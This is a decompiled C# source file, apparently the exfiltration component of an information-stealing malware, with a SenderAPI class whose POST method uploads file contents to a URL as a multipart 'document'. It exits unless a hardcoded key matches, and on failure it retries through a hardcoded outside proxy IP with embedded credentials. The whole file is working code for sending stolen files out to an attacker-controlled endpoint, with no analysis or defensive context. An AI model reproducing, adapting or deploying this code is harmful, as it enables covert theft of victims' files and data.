﻿using System;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

namespace SHARP
{
	// Token: 0x02000063 RID: 99
	public class SenderAPI
	{
		// Token: 0x06000225 RID: 549 RVA: 0x0000D648 File Offset: 0x0000B848
		public static void POST(byte[] file, string filename, string contentType, string url, string apiKey)
		{
			string b = "sodifjxicfvsrf87893ur89d9fgu8dsujrtioe4urgf98fg";
			if (apiKey != b)
			{
				Environment.Exit(0);
			}
			try
			{
				ServicePointManager.SecurityProtocol = (SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
				WebClient webClient = new WebClient
				{
					Proxy = null
				};
				string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
				webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
				string @string = webClient.Encoding.GetString(file);
				string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
				{
					text,
					filename,
					contentType,
					@string
				});
				byte[] bytes = webClient.Encoding.GetBytes(s);
				webClient.UploadData(url, "POST", bytes);
			}
			catch
			{
				ServicePointManager.SecurityProtocol = (SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
				using (WebClient webClient2 = new WebClient())
				{
					string text2 = "------------------------" + DateTime.Now.Ticks.ToString("x");
					webClient2.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text2);
					string string2 = webClient2.Encoding.GetString(file);
					string s2 = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
					{
						text2,
						filename,
						contentType,
						string2
					});
					byte[] bytes2 = webClient2.Encoding.GetBytes(s2);
					WebProxy proxy = new WebProxy("168.235.103.57", 3128)
					{
						Credentials = new NetworkCredential("echelon", "002700z002700")
					};
					webClient2.Proxy = proxy;
					webClient2.UploadData(url, "POST", bytes2);
				}
			}
		}

		// Token: 0x06000226 RID: 550 RVA: 0x0000D81C File Offset: 0x0000BA1C
		public static Task SendMessage(string Message)
		{
			SenderAPI.<SendMessage>d__1 <SendMessage>d__;
			<SendMessage>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<SendMessage>d__.Message = Message;
			<SendMessage>d__.<>1__state = -1;
			<SendMessage>d__.<>t__builder.Start<SenderAPI.<SendMessage>d__1>(ref <SendMessage>d__);
			return <SendMessage>d__.<>t__builder.Task;
		}
	}
}
